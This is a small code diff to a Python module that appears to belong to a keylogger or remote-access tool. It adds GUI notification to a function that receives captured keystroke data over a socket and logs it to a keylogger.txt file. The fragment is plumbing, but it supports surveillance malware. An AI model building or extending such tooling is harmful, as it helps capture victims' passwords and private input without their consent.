@@ -1,6 +1,8 @@
 
 import struct
 import os 
+import queue
+from GUI import communicate
 
 script_dir = os.path.dirname(__file__)
 filePath = os.path.join(script_dir, "GUI/tempData/keylogger.txt")
@@ -16,3 +18,4 @@ def receiveKeylogger(clientsocket):
     data = clientsocket.recv(1024).decode()
     with open(filePath, "a") as fi:
         fi.write(data)
+    communicate.queue_to_main.put("displaykeylogger")
